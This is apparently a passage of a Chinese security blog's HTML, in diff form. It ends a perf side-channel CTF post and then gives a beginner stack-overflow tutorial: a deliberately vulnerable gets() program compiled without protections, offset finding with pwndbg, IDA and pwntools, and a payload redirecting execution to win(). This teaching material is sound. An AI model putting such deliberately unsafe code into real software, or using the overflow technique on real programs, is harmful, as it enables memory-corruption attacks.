-</span></span><span style=display:flex><span>    flag <span style=color:#ff7b72;font-weight:700>+=</span> count_chr
-</span></span><span style=display:flex><span>    print(flag)
-</span></span></code></pre></div><h2 id=最后的垃圾话>最后的垃圾话</h2><p>这种打法还是太超模了，很大一部分简单的 re 题目就这一个exp都能差不多解决了，但是要是加上一些长度检验之类的防范措施，就得再手动修改下exp了</p><p>这篇文章还是受 guyinatuxedo 的启发，但是他的文章内容是错的，至少perf部分有问题，不要错把运行时间与指令数搞混淆</p><p>如果不使用 <code>instructions:u</code> 而去看运行时间，理论上也能出，但是受限于运行时环境的稳定性，可能需要多次计算取平均</p></div></article><aside class="article-toc article-toc-desktop" data-article-toc aria-label="Table of contents"><p class=toc-title>On this page</p><nav class=table-of-contents><ul><li><a href=#perf>perf</a><ul><li><a href=#简介>简介</a></li><li><a href=#准备perf>准备perf</a><ul><li><a href=#事前准备>事前准备</a></li><li><a href=#perf安装>perf安装</a></li><li><a href=#相关设置>相关设置</a></li><li><a href=#rmks>RMKS</a></li></ul></li><li><a href=#简单使用说明>简单使用说明</a></li></ul></li><li><a href=#side-chanel-attack>Side-Chanel-Attack</a><ul><li><a href=#简单原理>简单原理</a></li><li><a href=#例题>例题</a></li><li><a href=#exp>exp</a></li></ul></li><li><a href=#最后的垃圾话>最后的垃圾话</a></li></ul></nav></aside></div></div><section class=terminal aria-label=Terminal><div class=panel-header><p class=panel-title>Terminal</p><button class=panel-collapse type=button data-view-toggle=terminal aria-label="Collapse Terminal" title="Collapse Terminal">⌄</button></div><div class=terminal-body data-terminal-output aria-live=polite><p class=terminal-output>C0nvR3 Lab terminal ready. Type <span>help</span> for commands.</p></div><form class=terminal-form data-terminal><label for=terminal-command><span class=prompt data-terminal-user>C0nvR3@lab</span>:<span class=directory data-terminal-path>~/workspace</span><span data-terminal-symbol>$</span></label>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;请输入一些文本：&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#8b949e;font-style:italic>/* gets 不会限制读取长度 */</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>gets</span>(buffer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;你输入了：%s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, buffer);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> * print_info — 打印可用于偏移计算的信息
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic> */</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>print_info</span>(<span style=color:#ff7b72>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;-----------------</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;win() 地址：%p</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, (<span style=color:#ff7b72>void</span> <span style=color:#ff7b72;font-weight:700>*</span>)win);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;-----------------</span><span style=color:#79c0ff>\n\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>main</span>(<span style=color:#ff7b72>int</span> argc, <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>**</span>argv)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>print_info</span>();
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>vulnerable</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>程序正常退出。</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div></details><p>vulnerable 中 <code>gets</code> 会一直读取直到换行，完全不管 <code>buffer</code> 只有 32 字节。<code>win</code> 是一个正常情况下永远不会被调用的函数，我们的目标就是通过溢出覆盖返回地址，让程序"意外"进入 <code>win</code>。</p><p>用以下命令构建：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gcc -O0 -g -fno-stack-protector -z execstack -no-pie <span style=color:#79c0ff>\
+</span></span></span><span style=display:flex><span><span style=color:#79c0ff></span>    -o main main.c
+</span></span></code></pre></div><p>脚本会在 <code>build/</code> 下生成 <code>demo-no-protection</code>（关闭 Canary、PIE、NX，方便观察和利用）。</p><p>先用正常输入确认程序行为：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo hello | ./build/demo-no-protection
+</span></span></code></pre></div><p>程序应输出你输入的内容并正常退出。再试试超长输入：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#a5d6ff>&#34;print(&#39;A&#39; * 100)&#34;</span> | ./build/demo-no-protection
+</span></span></code></pre></div><p>程序崩溃（Segmentation fault），说明返回地址已被破坏，<code>ret</code> 跳到了一个无效位置。</p><h2 id=用-pwndbg-观察溢出>用 pwndbg 观察溢出</h2><p>启动gdb</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gdb main
+</span></span></code></pre></div><p>pwndbg 启动后会自动显示寄存器、栈和反汇编上下文。在 <code>vulnerable</code> 函数设置断点：</p><pre tabindex=0><code class=language-gdb data-lang=gdb>disassemble vulnerable          # 缩写：disas vulnerable
+</code></pre><p>你会看到类似下面的指令：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>   <span style=color:#f85149>0</span><span style=color:#d2a8ff;font-weight:700>x00000000004011f5</span> <span style=color:#f85149>&lt;+</span><span style=color:#a5d6ff>32</span><span style=color:#f85149>&gt;</span>:    <span style=color:#79c0ff;font-weight:700>lea</span>    <span style=color:#79c0ff;font-weight:700>rax</span>,[<span style=color:#79c0ff;font-weight:700>rbp-0x20</span>]  <span style=color:#8b949e;font-style:italic>;buffer 位于 rbp-0x20
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>   <span style=color:#f85149>0</span><span style=color:#d2a8ff;font-weight:700>x00000000004011f9</span> <span style=color:#f85149>&lt;+</span><span style=color:#a5d6ff>36</span><span style=color:#f85149>&gt;</span>:    <span style=color:#79c0ff;font-weight:700>mov</span>    <span style=color:#79c0ff;font-weight:700>rdi</span>,<span style=color:#79c0ff;font-weight:700>rax</span>
+</span></span><span style=display:flex><span>   <span style=color:#f85149>0</span><span style=color:#d2a8ff;font-weight:700>x00000000004011fc</span> <span style=color:#f85149>&lt;+</span><span style=color:#a5d6ff>39</span><span style=color:#f85149>&gt;</span>:    <span style=color:#79c0ff;font-weight:700>mov</span>    <span style=color:#79c0ff;font-weight:700>eax</span>,<span style=color:#a5d6ff>0x0</span>
+</span></span><span style=display:flex><span>   <span style=color:#f85149>0</span><span style=color:#d2a8ff;font-weight:700>x0000000000401201</span> <span style=color:#f85149>&lt;+</span><span style=color:#a5d6ff>44</span><span style=color:#f85149>&gt;</span>:    <span style=color:#79c0ff;font-weight:700>call</span>   <span style=color:#a5d6ff>0x401090</span> &lt;<span style=color:#79c0ff;font-weight:700>gets@plt</span>&gt;
+</span></span></code></pre></div><p>这里的关键信息是：<code>buffer</code> 起始于 <code>RBP-0x20</code>（32 字节偏移），而返回地址位于 <code>RBP+8</code>。因此从 <code>buffer[0]</code> 到返回地址需要跨越的字节数约为：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>0x20（buffer 到 RBP）+ 8（RBP 本身）= 0x28 = 40 字节
+</span></span></code></pre></div><blockquote><p>**注意：**不同编译器版本、优化选项和对齐策略可能导致实际偏移不同。请以你自己反汇编的结果为准，不要直接套用这里的数字。</p></blockquote><p>在 GDB 中实际操作：</p><pre tabindex=0><code class=language-gdb data-lang=gdb>break *0x0000000000401206   # 在 call gets 后下断点,此处可用 b 缩写代替 break
+run                         # 缩写 r
+</code></pre><p>程序等待输入时，输入一串可辨识的字符（如 <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>），然后用 pwndbg 命令观察栈：</p><pre tabindex=0><code class=language-gdb data-lang=gdb>pwndbg&gt; stack
+00:0000│ rax rsp 0x7fffffffda50 ◂— &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;
+... ↓            3 skipped
+04:0020│ rbp     0x7fffffffda70 ◂— &#39;AAAAAAAAAAAAAAAA&#39;
+05:0028│+008     0x7fffffffda78 ◂— &#39;AAAAAAAA&#39;
+06:0030│+010     0x7fffffffda80 —▸ 0x7fffffffdb00 ◂— 0x7fff00000000
+07:0038│+018     0x7fffffffda88 ◂— 0x1ffffdbb8
+</code></pre><p>你应该能看到输入字符串覆盖了栈上的大片区域。pwndbg 会高亮显示栈中被修改的值（对应的值也会被解析成字符串），如果继续执行（<code>continue</code>，缩写 <code>c</code>），<code>ret</code> 会取出被覆盖的返回地址并尝试跳转，导致崩溃</p><pre tabindex=0><code>   0x401214 &lt;vulnerable+63&gt;    mov    rdi, rax               RDI =&gt; 0x4020a4 ◂— 0x85e593bee8a0bde4
+   0x401217 &lt;vulnerable+66&gt;    mov    eax, 0                 EAX =&gt; 0
+   0x40121c &lt;vulnerable+71&gt;    call   printf@plt                  &lt;printf@plt&gt;
+
+   0x401221 &lt;vulnerable+76&gt;    nop
+   0x401222 &lt;vulnerable+77&gt;    leave
+ ► 0x401223 &lt;vulnerable+78&gt;    ret                                &lt;0x4141414141414141&gt;
+</code></pre><p>这里看到ret的目标是 0x4141414141414141 ，也就是刚刚输入的那一串A对应的 ASCII 码</p><h2 id=精确定位返回地址偏移>精确定位返回地址偏移</h2><p>知道"大概在 40 字节附近"还不够，我们需要精确到字节。两种常用方法：</p><h3 id=手动推算>手动推算</h3><p>从反汇编确认 <code>buffer</code> 到 <code>RBP</code> 的距离，再加上 8 字节（<code>RBP</code> 的大小）就是返回地址的偏移。例如：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>buffer 位于 RBP-0x20  → 32 字节到 RBP
+</span></span><span style=display:flex><span>RBP 占 8 字节           → 再加 8 字节
+</span></span><span style=display:flex><span>返回地址偏移 = 32 + 8 = 40 字节
+</span></span></code></pre></div><h3 id=在-ida-中从变量声明确认>在 IDA 中从变量声明确认</h3><p>将编译好的 <code>demo-no-protection</code> 拖入 IDA</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>vulnerable</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72>char</span> buffer[<span style=color:#a5d6ff>32</span>]; <span style=color:#8b949e;font-style:italic>// [rsp+0h] [rbp-20h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>
+</span></span><span style=display:flex><span>  <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;请输入一些文本：&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#d2a8ff;font-weight:700>gets</span>(buffer);
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72>return</span> <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;你输入了：%s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, buffer);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这里的 v1[32] 后面注释的就是该变量与 rsp rbp的相对位置关系，v1位于 rbp-0x20的位置，加上 saved rbp 的八字节就是 0x28 ，四十字节，我们也可以双击v1变量查看该函数的栈</p><pre tabindex=0><code>-0000000000000020 // Use data definition commands to manipulate stack variables and arguments.
+-0000000000000020 // Frame size: 20; Saved regs: 8; Purge: 0
+-0000000000000020
+-0000000000000020     _BYTE buffer;
+-000000000000001F     // padding byte
+-000000000000001E     // padding byte
+-000000000000001D     // padding byte
+-000000000000001C     // padding byte
+-000000000000001B     // padding byte
+-000000000000001A     // padding byte
+-0000000000000019     // padding byte
+-0000000000000018     // padding byte
+-0000000000000017     // padding byte
+-0000000000000016     // padding byte
+-0000000000000015     // padding byte
+-0000000000000014     // padding byte
+-0000000000000013     // padding byte
+-0000000000000012     // padding byte
+-0000000000000011     // padding byte
+-0000000000000010     // padding byte
+-000000000000000F     // padding byte
+-000000000000000E     // padding byte
+-000000000000000D     // padding byte
+-000000000000000C     // padding byte
+-000000000000000B     // padding byte
+-000000000000000A     // padding byte
+-0000000000000009     // padding byte
+-0000000000000008     // padding byte
+-0000000000000007     // padding byte
+-0000000000000006     // padding byte
+-0000000000000005     // padding byte
+-0000000000000004     // padding byte
+-0000000000000003     // padding byte
+-0000000000000002     // padding byte
+-0000000000000001     // padding byte
++0000000000000000     _QWORD __saved_registers;
++0000000000000008     _UNKNOWN *__return_address;
++0000000000000010
++0000000000000010 // end of stack variables
+</code></pre><p>这里可以直接的看出来变量之间的位置关系。</p><h3 id=用-pwntools-生成循环模式>用 pwntools 生成循环模式</h3><p>打开 python REPL 交互</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff7b72>from</span> <span style=color:#ff7b72>pwn</span> <span style=color:#ff7b72>import</span> <span style=color:#ff7b72;font-weight:700>*</span>
+</span></span><span style=display:flex><span>cyclic(<span style=color:#a5d6ff>0x50</span>)
+</span></span></code></pre></div><p>可以得到输出</p><pre tabindex=0><code>b&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#39;
+</code></pre><p>我们把引号中的部分复制出来，输入到程序中进行调试</p><pre tabindex=0><code> ► 0x401223 &lt;vulnerable+78&gt;    ret                                &lt;0x6161616c6161616b&gt;
+    ↓
+</code></pre><p>发现返回地址 0x6161616c6161616b
+用 pwntools 反查偏移：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff7b72>from</span> <span style=color:#ff7b72>pwn</span> <span style=color:#ff7b72>import</span> <span style=color:#ff7b72;font-weight:700>*</span>
+</span></span><span style=display:flex><span>cyclic_find(<span style=color:#a5d6ff>0x6161616c6161616b</span>)
+</span></span></code></pre></div><h2 id=控制-rip第一次成功劫持>控制 RIP：第一次成功劫持</h2><p>现在我们知道返回地址在偏移 40 处。接下来要做的很简单：在输入的第 40 字节开始写入目标地址
+我们提前通过 print_info() 函数知道了 win() 的地址，当然你也可以通过 gdb 或 IDA 得到（这里没有开启地址随机化保护）</p><p>在 pwntools 中构造攻击输入：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff7b72>from</span> <span style=color:#ff7b72>pwn</span> <span style=color:#ff7b72>import</span> <span style=color:#ff7b72;font-weight:700>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># 目标：跳转到 win 函数</span>
+</span></span><span style=display:flex><span>win_addr <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x401196</span>     <span style=color:#8b949e;font-style:italic># 替换为你实际获取的地址</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># 构造 payload：40 字节填充 + win 地址（小端序）</span>
+</span></span><span style=display:flex><span>payload <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>b</span><span style=color:#a5d6ff>&#39;A&#39;</span> <span style=color:#ff7b72;font-weight:700>*</span> <span style=color:#a5d6ff>40</span> <span style=color:#ff7b72;font-weight:700>+</span> p64(win_addr)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># 写入文件供 GDB 调试，或直接通过管道发给程序</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>with</span> open(<span style=color:#a5d6ff>&#39;payload.bin&#39;</span>, <span style=color:#a5d6ff>&#39;wb&#39;</span>) <span style=color:#ff7b72>as</span> f:
+</span></span><span style=display:flex><span>    f<span style=color:#ff7b72;font-weight:700>.</span>write(payload <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#79c0ff>b</span><span style=color:#a5d6ff>&#39;</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#39;</span>)
+</span></span></code></pre></div><p>在 GDB 中验证：</p><pre tabindex=0><code class=language-gdb data-lang=gdb>run &lt; payload.bin       # 缩写：r &lt; payload.bin
+</code></pre><pre tabindex=0><code>pwndbg&gt; r &lt; payload.bin
+Starting program: /home/converter258/workplace/syc/recruitment/task7/overflow/main &lt; payload.bin
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
+-----------------
+win() 地址：0x401196
+-----------------
+
+请输入一些文本：你输入了：AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
+
+=================================
+  你成功了！程序跳转到了 win 函数。
+=================================
+
+[Inferior 1 (process 28695) exited normally]
+</code></pre><p>此时程序不应崩溃，而是打印出 <code>win</code> 函数中的成功信息。这说明你已经成功控制了程序的执行流。</p><p>看到 <code>win</code> 函数的输出，恭喜——你完成了第一次栈溢出利用</p><h2 id=理解这背后发生了什么>理解这背后发生了什么</h2><p>整个过程可以拆成三步：</p><ol><li><p><strong>溢出写入</strong>：<code>gets</code> 把超过 32 字节的数据全部写入栈，依次覆盖了填充字节、旧 <code>RBP</code>，最终用我们构造的地址替换了原来的返回地址。</p></li><li><p><strong>函数返回</strong>：<code>vulnerable</code> 执行 <code>leave; ret</code>。<code>leave</code> 恢复 <code>RSP</code> 和 <code>RBP</code>，<code>ret</code> 从栈顶弹出返回地址并加载到 <code>RIP</code>。但由于返回地址已被覆盖，<code>RIP</code> 获得的是 <code>win</code> 的地址。</p></li><li><p><strong>控制流转移</strong>：CPU 从 <code>win</code> 的入口开始取指执行，程序进入本不该到达的路径。</p></li></ol><h2 id=常见问题与调试技巧>常见问题与调试技巧</h2><h3 id=偏移不对>偏移不对</h3><p>如果你按 40 字节偏移构造 payload 却没有成功，先确认反汇编中的实际偏移。在 pwndbg 中用 <code>stack 20</code> 观察栈，找输入字符串起始位置，再计算到返回地址的距离。</p><h3 id=段错误但不是目标地址>段错误但不是目标地址</h3><p>崩溃时 <code>RIP</code> 显示的值可能有多种情况：偏移少算了（地址整体偏移了几个字节）、多算了（地址被截断），或者地址本身写错了字节序。用 <code>info registers rip</code>（缩写 <code>i r rip</code>）查看崩溃时的实际值，与预期对比。</p><h3 id=小端序>小端序</h3><p>x86-64 是小端序，<code>p64(0x401156)</code> 在内存中的字节排列是 <code>\x56\x11\x40\x00\x00\x00\x00\x00</code>。如果手动构造地址，不要写反。</p><h3 id=栈对齐>栈对齐</h3><p>某些 glibc 函数（尤其是使用 movaps 指令的函数）要求栈 16 字节对齐。如果你的 payload 跳转到 <code>system</code> 后崩溃在 <code>movaps</code>，可以尝试在 payload 中跳过一个 <code>ret</code> 指令（多执行一次 ret）来调整对齐，或使用 <code>p64(ret_addr)</code> 加在目标地址前。这个技巧在 ret2libc 中会详细展开。</p><h3 id=pwntools-基础速查>pwntools 基础速查</h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff7b72>from</span> <span style=color:#ff7b72>pwn</span> <span style=color:#ff7b72>import</span> <span style=color:#ff7b72;font-weight:700>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p64(n)           <span style=color:#8b949e;font-style:italic># 整数 → 8 字节小端</span>
+</span></span><span style=display:flex><span>cyclic(n)              <span style=color:#8b949e;font-style:italic># 生成 n 字节循环模式</span>
+</span></span><span style=display:flex><span>cyclic_find(offset)  <span style=color:#8b949e;font-style:italic># 查偏移</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># 连接程序</span>
+</span></span><span style=display:flex><span>io <span style=color:#ff7b72;font-weight:700>=</span> process(<span style=color:#a5d6ff>&#39;./demo&#39;</span>)
+</span></span><span style=display:flex><span>io<span style=color:#ff7b72;font-weight:700>.</span>sendline(payload)
+</span></span><span style=display:flex><span>io<span style=color:#ff7b72;font-weight:700>.</span>interactive()
+</span></span></code></pre></div><h2 id=练习>练习</h2><h3 id=练习-1确认偏移>练习 1：确认偏移</h3><p>用你本机编译的 <code>demo</code>，分别通过反汇编、IDA 栈帧分析、pwndbg stack 和 pwntools cyclic 四种方法找出 <code>buffer</code> 到返回地址的精确偏移，结果是否一致？</p><details><summary>参考思路</summary><p>反汇编中找到 <code>lea rax, [rbp-0x??]</code> 获取 buffer 到 RBP 的距离；在 IDA 中打开 <code>vulnerable</code> 函数，左侧栈帧标注中的 <code>var_??</code> 即 buffer 偏移（如 <code>var_20</code> 表示 RBP-0x20），往上依次是保存的 RBP（<code>s</code>）和返回地址（<code>r</code>）；pwndbg 的 <code>stack</code> 命令直观看到输入数据在栈上的位置；cyclic 方法给出动态验证。四种方法得出的数字应当一致。</p></details><h3 id=练习-2跳转到不同目标>练习 2：跳转到不同目标</h3><p>把 <code>win</code> 函数的地址改为程序中其他函数的地址（如 <code>main</code>），观察程序行为。如果再跳回 <code>main</code>，会发生什么？</p><details><summary>参考思路</summary><p>跳回 <code>main</code> 通常会导致程序再次执行 <code>vulnerable</code>，形成循环。但如果栈已经被破坏，第二次调用可能立即崩溃。这也能帮助你理解"控制 RIP"不等于"程序照常运行"——栈状态已经不正常了。</p></details></div></article><aside class="article-toc article-toc-desktop" data-article-toc aria-label="Table of contents"><p class=toc-title>On this page</p><nav class=table-of-contents><ul><li><a href=#什么是栈溢出>什么是栈溢出</a></li><li><a href=#演示程序>演示程序</a></li><li><a href=#用-pwndbg-观察溢出>用 pwndbg 观察溢出</a></li><li><a href=#精确定位返回地址偏移>精确定位返回地址偏移</a><ul><li><a href=#手动推算>手动推算</a></li><li><a href=#在-ida-中从变量声明确认>在 IDA 中从变量声明确认</a></li><li><a href=#用-pwntools-生成循环模式>用 pwntools 生成循环模式</a></li></ul></li><li><a href=#控制-rip第一次成功劫持>控制 RIP：第一次成功劫持</a></li><li><a href=#理解这背后发生了什么>理解这背后发生了什么</a></li><li><a href=#常见问题与调试技巧>常见问题与调试技巧</a><ul><li><a href=#偏移不对>偏移不对</a></li><li><a href=#段错误但不是目标地址>段错误但不是目标地址</a></li><li><a href=#小端序>小端序</a></li><li><a href=#栈对齐>栈对齐</a></li><li><a href=#pwntools-基础速查>pwntools 基础速查</a></li></ul></li><li><a href=#练习>练习</a><ul><li><a href=#练习-1确认偏移>练习 1：确认偏移</a></li><li><a href=#练习-2跳转到不同目标>练习 2：跳转到不同目标</a></li></ul></li></ul></nav></aside></div></div><section class=terminal aria-label=Terminal><div class=panel-header><p class=panel-title>Terminal</p><button class=panel-collapse type=button data-view-toggle=terminal aria-label="Collapse Terminal" title="Collapse Terminal">⌄</button></div><div class=terminal-body data-terminal-output aria-live=polite><p class=terminal-output>C0nvR3 Lab terminal ready. Type <span>help</span> for commands.</p></div><form class=terminal-form data-terminal><label for=terminal-command><span class=prompt data-terminal-user>C0nvR3@lab</span>:<span class=directory data-terminal-path>~/workspace</span><span data-terminal-symbol>$</span></label>
 <input id=terminal-command name=command type=text autocomplete=off autocapitalize=off spellcheck=false aria-label="Terminal command"></form><template id=terminal-filesystem><i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/posts></i>
 <i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/posts/wsl2_env data-url=/posts/wsl2-setup/></i>
 <i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/wsl2_env/image-1.png></i>
